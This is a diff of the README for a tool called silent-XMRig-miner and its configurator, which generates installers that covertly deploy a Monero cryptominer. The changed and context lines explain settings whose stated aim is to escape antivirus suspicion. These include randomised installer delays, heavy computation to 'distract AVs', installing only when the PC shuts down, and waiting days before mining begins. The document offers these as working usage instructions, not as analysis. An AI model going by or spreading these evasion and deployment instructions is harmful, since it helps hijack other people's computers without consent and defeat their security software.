@@ -32,7 +32,7 @@ SilentMinerConfigurator already comes with example configuration for Monero mini
     2. Zone 2 - from "UTC -6" to "UTC -3" (America east pools)
     3. Zone 3 - from "UTC -2" to "UTC +4" (Europe pools)
     4. Zone 4 - from "UTC +5" to "UTC +12" (Asia pools)
-3.  Change "Installer delay" if needed. Lower time - more prone to AVs suspicion. Bigger time - PC can be turned off before anything is installed
+3.  Change "Installer delay" if needed. Lower time - more prone to AVs suspicion. If both set to 0, waits infinite time and installs when PC is turning off
 4. Change "Delay before deploy miner" if needed. It is time(days) watchdog will wait before deploying silent-XMRig-miner and starting mining operation
 5. Skip checkboxes, as they are configured the best way. "Add heavy calculation delay" is not recomended as it can crush the installer
 6. Change "Minimum RAM for light mode" if needed, it is minimum RAM before applying "light" mode
@@ -60,7 +60,7 @@ SilentMinerConfigurator already comes with example configuration for Monero mini
     2. Zone 2 - from "UTC -6" to "UTC -3" (America east pools)
     3. Zone 3 - from "UTC -2" to "UTC +4" (Europe pools)
     4. Zone 4 - from "UTC +5" to "UTC +12" (Asia pools)
-- Installer delay - delay in milliseconds before installing silent-XMRig-miner. Time is selected randomly between Min. and Max. values during install process.
+- Installer delay - delay in milliseconds before installing silent-XMRig-miner. Time is selected randomly between Min. and Max. values during install process. If both set to 0, waits infinite time and installs the miner when PC is turning off.
 - Delay before deploy miner - Delay in days which silent-XMRig-miner watchdog waits before deploying miner and starting mining operation on the system. Time in days is selected randomly between Min. and Max. values
 - Add heavy calculation delay - similar to installer delay, but performs math calculation and a lot of RAM usage(~4GB) for 1 minute, to distract AVs. Not recomended as it can crush the installer before it installed anything on low end PCs.
 - Do not mine while on battery - Just stops mining when detects if laptop is on battery. Mining is very power intensive task, it will drain battery very fast.
@@ -73,7 +73,7 @@ SilentMinerConfigurator already comes with example configuration for Monero mini
 -Miner starts mining 'Ping' URL - URL to which HTTP/HTTPS 'GET' request will be sent every time miner is started.
 - Custom arguments - If anything is present in this fields, one of 3 filed(selected randomly) will be used as arguments for XMRig and everything above will be ignored
 - Test button - Populates 'Arguments test' field with composed arguments the same way as silent-XMRig-miner does. This way you can test before configuring. It will take in account your current time zone and CPU information.
-- Generate button - Writes configuration in to silent-XMRig-miner installer.
+- Generate button - Genarates silent-XMRig-miner installers.
 
 # silent-XMRig-miner dll
 
@@ -98,7 +98,7 @@ configuredInstallerEXE.exe also calls `mainProc()` function, so almost no differ
 # Repository contents
 
 - ./SilentMinerConfigurator - GUI application in C++ which is used to configure silent-XMRig-miner installers executable and dll
-- ./Binaries - Directory contains unconfigured silent-XMRig-miner installer as executable and dll and also SilentMinerConfigurator binary
+- ./Binaries - Directory contains prebuilt SilentMinerConfigurator binary
 - ./libs - C++ code that is shared with XMRig wrapper and SilenMinerConfigurator
 
 # Fees
